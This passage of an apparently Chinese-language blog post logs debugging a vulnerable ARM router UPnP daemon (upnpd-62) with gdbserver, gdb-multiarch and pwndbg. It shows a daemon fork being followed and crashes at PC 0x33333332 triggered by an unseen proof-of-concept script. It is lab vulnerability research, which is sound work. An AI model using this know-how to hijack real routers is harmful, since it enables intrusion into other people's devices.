class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看目标架构</span></span><br><span class="line">file upnpd-62</span><br><span class="line">upnpd-62: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找合适的gdbserver（静态链接的</span></span><br><span class="line">find . -<span class="built_in">type</span> f | xargs file | grep <span class="string">"ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV)"</span></span><br><span class="line">./gdbserver.armv7_7.7: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传输 gdbserver.armv7_7.7 到设备</span></span><br><span class="line">wget http://192.168.10.2:8000/gdbserver.armv7_7.7</span><br><span class="line">chmod +x gdbserver.armv7_7.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助，可能每个都不一样</span></span><br><span class="line">./gdbserver.armv7_7.7 --<span class="built_in">help</span><span class="comment"># 有的是-h</span></span><br><span class="line">Usage:  gdbserver [OPTIONS] COMM PROG [ARGS ...]</span><br><span class="line">        gdbserver [OPTIONS] --attach COMM PID</span><br><span class="line">        gdbserver [OPTIONS] --multi COMM</span><br><span class="line"></span><br><span class="line">COMM may either be a tty device (<span class="keyword">for</span> serial debugging), or</span><br><span class="line">HOST:PORT to listen <span class="keyword">for</span> a TCP connection.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --debug               Enable general debugging output.</span><br><span class="line">  --remote-debug        Enable remote protocol debugging output.</span><br><span class="line">  --version             Display version information and <span class="built_in">exit</span>.</span><br><span class="line">  --wrapper WRAPPER --  Run WRAPPER to start new programs.</span><br><span class="line">  --once                Exit after the first connection has closed.</span><br><span class="line">Report bugs to <span class="string">"&lt;http://www.gnu.org/software/gdb/bugs/&gt;"</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动gdbserver</span></span><br><span class="line"><span class="comment"># 不写ip表0.0.0.0表任意</span></span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 24881</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch </span><br><span class="line">GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>.</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture armv5t<span class="comment"># 怎么确定具体架构，直接arm行不行？</span></span><br><span class="line">The target architecture is assumed to be armv5t</span><br><span class="line">pwndbg&gt; file upnpd-62 <span class="comment"># 要从中读取符号，同gdb + 程序 同效果</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">break</span> *main</span><br><span class="line">Breakpoint 1 at 0x22530</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/<span class="comment"># 设置根目录，否则找不到共享库</span></span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">set endian little# 设置大小端</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q upnpd-62 </span></span><br><span class="line"><span class="string">pwndbg: loaded 194 commands. Type pwndbg [filter] for a list.</span></span><br><span class="line"><span class="string">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span></span><br><span class="line"><span class="string">Reading symbols from upnpd-62...(no debugging symbols found)...done.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># lxl@ubuntu:~/Desktop/000$ md5sum squashfs-root/lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string">9294078b30f80793a5994290ebe671fb  squashfs-root/lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string"># md5sum /lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string">9294078b30f80793a5994290ebe671fb  /lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li>daemon进程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 正常启动：前台启动（并未指定&amp;），但是其没有输出，也未卡在前台，加之名字d结尾，应该是守护进程daemon</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 5721 admin      2876 S   grep upnp</span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 5781 admin      2492 S   ./upnpd-62</span><br><span class="line"> 5795 admin      2876 S   grep upnp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2 调试器启动：注意是正常退出，推测fork了子进程，父进程正常结束</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 9066 admin      2876 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62 # quiet不打印版本等信息</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Inferior 1 (process 9128) exited normally]<span class="comment"># 正常退出</span></span><br><span class="line">(gdb) q</span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 9168 admin      2492 S   /tmp/upnpd-62</span><br><span class="line"> 9212 admin      2876 S   grep upnp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 跟随子进程（默认跟父）：确实创建了子进程</span></span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-fork-mode child<span class="comment"># 默认parent</span></span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[New process 9616]<span class="comment"># 新进程</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line"> 9533 admin      6700 S   ./gdb-arm-static-7.11 -q upnpd-62</span><br><span class="line"> 9616 admin      2492 S   /tmp/upnpd-62<span class="comment"># pid匹配</span></span><br><span class="line"> 9931 admin      2892 R   grep upnp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 ida静态分析：没有fork函数，有daemon（会调用fork）</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( daemon(1, 1) == -1 )</span><br></pre></td></tr></table></figure>
<ul>
<li>本地调试：gdb直接启动</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb启动程序并continue后，执行poc（python3 poc.py</span></span><br><span class="line"><span class="comment"># 需要set follow-fork-mode child，因为创建子进程后父进程正常退出</span></span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-</span><br><span class="line">follow-exec-mode  follow-fork-mode</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[New process 9616]</span><br><span class="line"></span><br><span class="line">Thread 2.1 <span class="string">"upnpd-62"</span> received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[Switching to process 9616]</span><br><span class="line">0x33333332 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<ul>
<li>本地调试：gdb附加进程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常启动程序，gdb附加并continue后，执行poc（python3 poc.py</span></span><br><span class="line"><span class="comment"># 不需set follow-fork-mode child，因为附加的就是已经创建好的子进程（为守护进程</span></span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">12698 admin      2492 S   ./upnpd-62</span><br><span class="line">12886 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q --pid=12698</span></span><br><span class="line">Attaching to process 12698</span><br><span class="line">Reading symbols from /tmp/upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libnvram.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libacos_shared.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libnat.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libcrypt.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libgcc_s.so.1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libm.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">0x401a44cc <span class="keyword">in</span> select () from /lib/libc.so.0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x33333332 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<ul>
<li>远程调试：gdbserver启动程序//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 14238</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little </span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62 </span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/000$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># </span></span><br><span class="line"><span class="string"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line"><span class="string">Process upnpd-62 created; pid = 14238</span></span><br><span class="line"><span class="string">Listening on port 1234</span></span><br><span class="line"><span class="string">Remote debugging from host 192.168.10.2</span></span><br><span class="line"><span class="string">Segmentation fault</span></span><br></pre></td></tr></table></figure>
<ul>
<li>–debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">17500 admin      2872 R   grep upnp</span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 --debug :1234 upnpd-62</span></span><br><span class="line">new_argv[0] = <span class="string">"upnpd-62"</span></span><br><span class="line">Process upnpd-62 created; pid = 17555</span><br><span class="line">linux_wait: [Process 17555]</span><br><span class="line">linux_wait_for_lwp: &lt;all threads&gt;</span><br><span class="line">my_waitpid (-1, 0x40000000)</span><br><span class="line">blocking</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (-1, 0x1): status(57f), 17555</span><br><span class="line">Got an event from 17555 (57f)</span><br><span class="line">stop pc is 400f5930</span><br><span class="line">pc is 0x400f5930</span><br><span class="line">stop pc is 0x400f5930</span><br><span class="line">stop pc is 400f5930</span><br><span class="line">linux_wait_for_lwp: pc is 0x400f5930</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(137f), 17556</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(1057f), 17556</span><br><span class="line">my_waitpid (17557, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17557, 0x0): status(137f), 17557</span><br><span class="line">my_waitpid (17557, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17557, 0x0): status(9), 17557</span><br><span class="line">my_waitpid (sigchld_handler</span><br><span class="line">17556, 0x0)</span><br><span class="line">my_waitpid (17556, 0x0): status(117f), 17556</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(9), 17556</span><br><span class="line">Hit a non-gdbserver <span class="built_in">trap</span> event.</span><br><span class="line">wait_for_sigstop: LWP 17555 already stopped</span><br><span class="line">Checking whether LWP 17555 needs to move out of the jump pad...no</span><br><span class="line">linux_wait ret = LWP 17555.17555, 1, 5</span><br><span class="line">Listening on port 1234</span><br><span class="line">handling possible accept event</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">linux_async (0), previous=0</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">linux_async (0), previous=0</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">wait_for_sigstop: LWP 17555 already stopped</span><br><span class="line">Checking whether LWP 17555 needs to move out of the jump pad...no</span><br><span class="line">Writing resume reply <span class="keyword">for</span> LWP 17555.17555:1</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">Trying host libthread_db library: libthread_db.so.1.</span><br><span class="line">Segmentation fault</span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">17799 admin      2492 S   upnpd-62</span><br><span class="line">17867 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>–remote-debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">18053 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 --remote-debug :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 18108</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">[getpkt: discarding char <span class="string">'+'</span>]</span><br><span class="line">getpkt (<span class="string">"qSupported:multiprocess+;swbreak+;hwbreak+;qRelocInsn+;fork-events+;vfork-events+;exec-events+;vContSupported+;QThreadEvents+;no-resumed+;xmlRegisters=i386"</span>);  [sending 